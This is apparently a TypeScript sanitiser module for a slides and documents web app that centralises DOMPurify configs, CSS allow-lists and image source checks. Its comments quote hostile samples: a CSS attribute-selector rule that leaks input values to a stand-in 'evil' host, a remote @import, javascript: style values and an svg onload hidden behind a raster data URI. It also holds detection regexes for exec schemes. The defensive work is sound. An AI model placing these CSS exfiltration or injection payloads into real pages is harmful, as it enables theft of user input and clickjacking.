/**
 * sanitize — single source of truth for DOMPurify configuration.
 * ----------------------------------------------------------------------------
 * Previously every surface that rendered user/peer HTML carried its own inline
 * DOMPurify config block (SlidesEditor, SlidePreview, PresenterView,
 * slidesExport, …). Those blocks had drifted apart (some forbade <iframe>, some
 * had a shorter on*-handler list), which is exactly how an XSS gap sneaks in.
 *
 * This module consolidates them into named, audited configs so there is one
 * place to reason about what HTML we let through.
 *
 *   sanitizeRichHtml(html)   — slide / rich-document HTML (Tiptap / Reveal tags)
 *   sanitizeSlideHtml(html)  — alias of sanitizeRichHtml (slides surfaces)
 *   stripHtml(html)          — sanitize, then return text content only
 *
 * Behaviour note: the canonical rich config is the *strictest* of the historic
 * variants (it forbids <iframe> and the full set of inline event handlers), so
 * consolidating onto it never loosens sanitisation — only tightens the few
 * surfaces that lagged behind. Legitimate Tiptap/Reveal markup is unaffected.
 */

import DOMPurify from 'dompurify'

// Inline event-handler attributes we always strip (defence-in-depth — DOMPurify
// already removes unknown on* handlers, but listing them is explicit + audited).
const FORBID_EVENT_ATTR = [
  'onerror', 'onload', 'onclick', 'onmouseover', 'onfocus', 'onblur',
  'onchange', 'onsubmit', 'onkeydown', 'onkeyup', 'onkeypress',
]

// Rich HTML (slides, rich documents): allow the standard HTML profile but
// forbid anything that can execute code or capture input.
//
// THIRD-PASS (sec/office-triple): `<style>` was NOT forbidden and DOMPurify's
// html profile keeps it. Its CSS is only weakly filtered — a `<style>` block
// carrying a full-viewport `position:fixed;inset:0` overlay (clickjacking / UI
// redress), an attribute-selector data-exfil rule
// (`input[value^="a"]{background:url(https://evil/…)}`), or `@import
// "https://evil/…"` ALL survived sanitisation verbatim. That matters because the
// slide surfaces render this sanitiser's output through `dangerouslySetInnerHTML`
// (SlideCanvas / SlidePreview / SlidesEditor / PresenterView) — so a hostile CRDT
// slide-object `html`, or imported HTML, could inject page-wide CSS straight into
// the live app DOM. Our style policy is inline-attribute allow-listing only
// (sanitizeStyleValue); a `<style>` ELEMENT bypasses it entirely and TipTap/Reveal
// never legitimately emit one, so we forbid the tag outright (content removed, not
// dumped). `base`/`link`/`meta` are forbidden for the same document-hijack reasons
// (`<base href>` retargets every relative URL; `<link rel=stylesheet>` pulls remote
// CSS) — none are ever needed in editor/slide content.
export const RICH_HTML_CONFIG = {
  USE_PROFILES: { html: true },
  FORBID_TAGS: [
    'script', 'iframe', 'object', 'embed', 'form', 'input', 'button',
    'style', 'base', 'link', 'meta',
  ],
  FORBID_ATTR: FORBID_EVENT_ATTR,
}

/** Sanitise rich HTML (Tiptap / Reveal slide content). */
export function sanitizeRichHtml(html: string | null | undefined): string {
  return DOMPurify.sanitize(html ?? '', RICH_HTML_CONFIG)
}

// ── WAVE-52: Docs HTML sanitiser (tables) ────────────────────────────────────
// Docs import (.html / .docx → _html) and HTML/Markdown export flow user- and
// peer-supplied markup through TipTap. The standard HTML profile already keeps
// the exact table tags we need — <table>/<thead>/<tbody>/<tr>/<th>/<td> — plus
// the structural attributes colspan / rowspan / scope, and it strips on*
// handlers. What it does NOT catch is a dangerous *value* inside an otherwise-
// allowed `style` attribute (e.g. `<td style="background:url(javascript:…)">`,
// a `position:fixed` full-viewport click-jacking overlay, or a fetch via the
// CSS `image()` / `src()` functions that carry no literal `url(` token).
//
// WAVE-53 (hardening): the original guard was a *blocklist* regex
// (url()/expression()/javascript:/@import/…). A blocklist over CSS is brittle —
// it missed `position:fixed`/`position:absolute` overlays entirely, and the
// fetch-capable `image()`/`src()` image functions slip past a `url(`-only match.
// We replace it with a property *allow-list*: parse the declaration and keep
// ONLY the inline properties Docs/TipTap actually emit (colour, font, spacing,
// alignment, borders, table sizing, page-break). Anything else — positioning,
// content:, behavior:, animation, any fetch function, any future-dangerous
// property — is dropped. This is strictly tighter than before and fail-closed
// by construction (unknown property ⇒ dropped), while every legitimate Docs
// style survives. A value inside an allowed property that still smells of a
// fetch/exec construct (url()/expression()/image()/… ) drops that one
// declaration too, belt-and-braces.
//
// Allow-list scoped to what StarterKit + Color/Highlight/FontSize/FontFamily/
// TextAlign/Table/footnotes emit, plus the benign layout styles imported .docx/
// .html carry. Kept intentionally small; widen only with review.
const SAFE_CSS_PROPS = new Set([
  'color', 'background-color', 'background',
  'font-family', 'font-size', 'font-weight', 'font-style', 'font-variant',
  'line-height', 'letter-spacing', 'word-spacing',
  'text-align', 'text-decoration', 'text-decoration-line', 'text-indent',
  'text-transform', 'vertical-align', 'white-space', 'direction',
  'margin', 'margin-top', 'margin-right', 'margin-bottom', 'margin-left',
  'padding', 'padding-top', 'padding-right', 'padding-bottom', 'padding-left',
  'border', 'border-top', 'border-right', 'border-bottom', 'border-left',
  'border-color', 'border-width', 'border-style', 'border-radius',
  'border-collapse', 'border-spacing',
  'width', 'min-width', 'max-width', 'height', 'min-height', 'max-height',
  // WAVE-57: `display` + `float` are needed to align an inline <img> (a centred
  // image is `display:block;margin:auto`; left/right can use `float`). Both take
  // only keyword values — no url()/fetch/exec construct is expressible — so they
  // are value-safe. (A `position:*` overlay stays OUT of the allow-list.)
  'display', 'float', 'clear', 'object-fit',
  'page-break-before', 'page-break-after', 'page-break-inside',
  'break-before', 'break-after', 'break-inside',
  'list-style-type', 'list-style-position',
])

// A declaration VALUE is rejected outright (even for an allow-listed property)
// if it carries a fetch/exec construct. `background`/`background-color` are on
// the allow-list for solid colours; this stops `background:url(…)` /
// `background:image(…)` from riding in on them. Scheme-agnostic: any external
// or javascript: fetch is refused. Also catches CSS escapes (`\`) which are an
// obfuscation channel with no legitimate use in the styles Docs emits.
const DANGEROUS_CSS_VALUE =
  /url\s*\(|(?:^|[^-\w])(?:image|image-set|-webkit-image-set|cross-fade|paint|src|element)\s*\(|expression\s*\(|javascript:|@import|behaviou?r\s*:|-moz-binding|\\/i

// Parse a `style` attribute value, keep only allow-listed properties whose
// value is free of fetch/exec constructs. Returns the rebuilt (possibly empty)
// declaration string. Fail-closed: anything not understood is dropped.
export function sanitizeStyleValue(styleValue: unknown): string {
  if (typeof styleValue !== 'string' || !styleValue) return ''
  const kept = []
  for (const decl of styleValue.split(';')) {
    const idx = decl.indexOf(':')
    if (idx === -1) continue
    const prop = decl.slice(0, idx).trim().toLowerCase()
    const value = decl.slice(idx + 1).trim()
    if (!prop || !value) continue
    if (!SAFE_CSS_PROPS.has(prop)) continue          // property not allow-listed → drop
    // Strip CSS comments before the fetch/exec check so `u/**/rl(` obfuscation
    // can't hide a construct from the regex. (Such forms don't tokenise as a
    // real url() in a browser, but we refuse them anyway — fail-closed.)
    const probe = value.replace(/\/\*[\s\S]*?\*\//g, '')
    if (DANGEROUS_CSS_VALUE.test(probe)) continue     // fetch/exec construct in value → drop
    kept.push(`${prop}:${value}`)
  }
  return kept.join(';')
}

// ── WAVE-57: <img> src policy (inline images in Docs) ────────────────────────
// Docs gained image insert (data:-URI base64 raster + https? URLs). DOMPurify's
// html profile already keeps <img src alt width height> and strips on* handlers
// + javascript:/vbscript: src — but it does NOT reject two live hazards:
//   1. Script-bearing / XML data: URIs on <img src> — data:image/svg+xml (an
//      SVG can carry <script>/on* and, though inert in a browser's *secure*
//      image mode, that reliance is fragile — reject it), data:image/svg,
//      data:text/html, application/xml, text/xml. We keep ONLY raster data:
//      images (png/jpeg/gif/webp/apng/avif/bmp/x-icon) and drop every other
//      data: URI. Mirrors vulos-mail-ui wave-42/sanitize's SAFE_RASTER_DATA_URI.
//   2. `srcset` — a second content-loading channel that bypasses the `src`
//      check entirely and can smuggle a remote/exfil fetch or an unsafe data:
//      candidate. Docs never emits srcset (TipTap Image renders src only), so we
//      strip it unconditionally rather than parse+re-validate each candidate.
// Non-raster/non-image data: on src ⇒ drop the whole src (element survives, just
// image-less). https?: and relative src are allowed — Docs content is the user's
// OWN document (unlike hostile inbound mail), so a remote <img> is acceptable;
// see the privacy note on sanitizeDocHtml() re: the tracking-pixel trade-off.
//
// WAVE-58 (hardening): two gaps closed after the wave-57 red-team.
//   (a) The raster allow-list matched the DECLARED prefix only — `data:image/png,
//       <svg onload=…>` (a raster MIME LIE carrying markup) slipped through. A
//       real embedded raster image is ALWAYS base64 (that's what FileReader/
//       canvas emit); a comma-form `data:image/png,<markup>` is never a genuine
//       raster and only exists to lie about the MIME. Require `;base64,` so the
//       allow-list can't be satisfied by a declared-raster prefix in front of
//       url-encoded script/markup. (Fail-closed: a legit non-base64 raster does
//       not exist in the wild; if one ever does it degrades to a broken image,
//       never to an exec.)
//   (b) The hook gated `src`/`srcset` only. DOMPurify keeps a bare `href` (and
//       normalises SVG `<image href>` → `<img href>`) WITHOUT scheme-validating
//       it for <img>, so a script-bearing `data:image/svg+xml`/`data:text/html`
//       rode in on `href`. `<img href>` is inert in a browser, but it defeats the
//       "every non-raster data: URI is stripped" invariant and re-serialises to a
//       live SVG `<image href>` in some converters — so we gate href/xlink:href
//       with the SAME policy as src (see the attr list in the hook below).
const DATA_URI = /^\s*data:/i
const SAFE_RASTER_DATA_URI =
  /^\s*data:image\/(?:png|jpe?g|gif|webp|bmp|x-icon|vnd\.microsoft\.icon|apng|avif);base64,/i

/** True for a data: URI that is NOT an allow-listed raster image (svg/xml/html/…). */
function isUnsafeDataUri(v: string): boolean {
  return DATA_URI.test(v) && !SAFE_RASTER_DATA_URI.test(v)
}

// Content-loading / linkable attributes on an <img> whose value must obey the
// same data:-URI policy as `src`. `srcset`/`imagesrcset` are separate candidate-
// list channels we strip wholesale (Docs never emits them). Any of these missing
// from DOMPurify's per-attribute scheme validation is a bypass — we belt-and-
// brace them all here.
const IMG_URI_ATTRS = new Set(['src', 'href', 'xlink:href', 'lowsrc', 'dynsrc'])
const IMG_STRIP_ATTRS = new Set(['srcset', 'imagesrcset', 'ping'])

/**
 * Src-policy predicate reused by the DocImage node (see docsImage.js) so the
 * SAME allow-list gates the collab/JSON-reload ingress path, which never flows
 * through DOMPurify. Returns true for a src that is safe to render on an <img>:
 * a relative/http(s) URL or an allow-listed base64 raster data: URI. Any other
 * data: URI (svg/xml/html/non-base64 raster-lie) and any javascript:/vbscript:/
 * other exec scheme is rejected fail-closed.
 */
const EXEC_SCHEME = /^\s*(?:javascript|vbscript|data\s*:\s*text|data\s*:\s*application|file|blob\s*:\s*javascript)/i
export function isSafeImageSrc(v: unknown): boolean {
  if (typeof v !== 'string') return false
  const s = v.trim()
  if (!s) return false
  if (DATA_URI.test(s)) return SAFE_RASTER_DATA_URI.test(s)   // only base64 raster data:
  if (EXEC_SCHEME.test(s)) return false
  // A scheme we don't explicitly allow? Permit only http(s), protocol-relative,
  // and same-origin relative refs (no colon-scheme, or an explicit http/https).
  if (/^[a-z][a-z0-9+.-]*:/i.test(s)) return /^\s*https?:/i.test(s)
  return true
}

let _docHookInstalled = false
function ensureDocStyleHook() {
  if (_docHookInstalled) return
  _docHookInstalled = true
  // NOTE: DOMPurify hooks are global to the singleton. Scoping by a marker set
  // just before each sanitizeDocHtml() call keeps this guard from silently
  // changing behaviour of the other sanitize* surfaces (slides/search) that do
  // not opt in. When active, we rewrite the style attr to its safe subset
  // (never a wholesale keepAttr=false, so a single bad declaration no longer
  // discards the element's benign styling).
  DOMPurify.addHook('uponSanitizeAttribute', (_node, data) => {
    if (!_docStyleGuardActive) return
    if (data.attrName === 'style') {
      const safe = sanitizeStyleValue(data.attrValue || '')
      if (safe) {
        data.attrValue = safe
      } else {
        data.keepAttr = false
      }
      return
    }
    // WAVE-57/58: reject unsafe data: URIs on every content-loading / linkable
    // attribute (src, and — WAVE-58 — href/xlink:href/lowsrc/dynsrc which
    // DOMPurify does NOT scheme-validate for <img>), and drop the candidate-list
    // + ping channels outright.
    if (IMG_URI_ATTRS.has(data.attrName)) {
      if (isUnsafeDataUri(data.attrValue || '')) data.keepAttr = false
      return
    }
    if (IMG_STRIP_ATTRS.has(data.attrName)) {
      data.keepAttr = false
    }
  })
}

// Flag toggled around sanitizeDocHtml so the shared hook only enforces the Docs
// style policy for Docs content (import/export), not for every DOMPurify call.
let _docStyleGuardActive = false

// Same policy surface as RICH_HTML_CONFIG (tables already survive the html
// profile); the CSS-value guard is added via the hook above.
export const DOC_HTML_CONFIG = RICH_HTML_CONFIG

/**
 * Sanitise Docs HTML (import + export). Preserves table structure + colspan/
 * rowspan/scope; strips scripts, on* handlers, and reduces every inline `style`
 * to an allow-list of benign properties (defeats <td style="…javascript:…">
 * style-injection, `position:fixed` overlays, and fetch-function exfiltration).
 *
 * WAVE-57 (inline images): keeps <img src alt width height> but the src is
 * gated — javascript:/vbscript: (DOMPurify default) and every non-raster data:
 * URI (data:image/svg+xml, data:text/html, …) are stripped, and `srcset` is
 * dropped outright. Only raster data: images and http(s)/relative URLs survive.
 *
 * Privacy note: a remote https: <img> in a Doc will fetch on render (a tracking
 * pixel could see the reader's IP/UA). This is DELIBERATELY allowed — unlike an
 * inbound email, a Doc is the user's OWN content (they inserted the URL), so
 * there is no untrusted-sender beacon threat; blocking it would break the
 * legitimate "insert image from URL" feature. The XSS surface (script exec) is
 * closed regardless; only the network-fetch privacy trade-off is accepted here.
 */
export function sanitizeDocHtml(html: string | null | undefined): string {
  ensureDocStyleHook()
  _docStyleGuardActive = true
  try {
    return DOMPurify.sanitize(html ?? '', DOC_HTML_CONFIG)
  } finally {
    _docStyleGuardActive = false
  }
}

/** Alias — slides surfaces read more clearly as "sanitizeSlideHtml". */
export const sanitizeSlideHtml = sanitizeRichHtml

/** Sanitise, then return plain text content only (no markup). */
export function stripHtml(html: string | null | undefined): string {
  const div = document.createElement('div')
  // Sanitise before DOM assignment so text extraction can't execute payloads.
  div.innerHTML = sanitizeRichHtml(html)
  return div.textContent || div.innerText || ''
}

// ── Narrower, context-specific allow-lists ──────────────────────────────────
// These are intentionally tighter than RICH_HTML_CONFIG — each surface only
// renders the exact tags it produces. Centralised here so all DOMPurify policy
// lives in one audited file.

// Search-result highlighting: only the <mark> wrapper survives.
export const SEARCH_HIGHLIGHT_CONFIG = {
  ALLOWED_TAGS: ['mark'],
  ALLOWED_ATTR: ['class'],
}

/** Sanitise search-result HTML, keeping only <mark> highlights. */
export function sanitizeSearchHighlight(html: string | null | undefined): string {
  return DOMPurify.sanitize(html ?? '', SEARCH_HIGHLIGHT_CONFIG)
}

/** Strip all markup, returning plain text (captions, defence-in-depth). */
export function sanitizeToText(text: unknown): string {
  if (typeof text !== 'string') return ''
  return DOMPurify.sanitize(text, { ALLOWED_TAGS: [], ALLOWED_ATTR: [] })
}
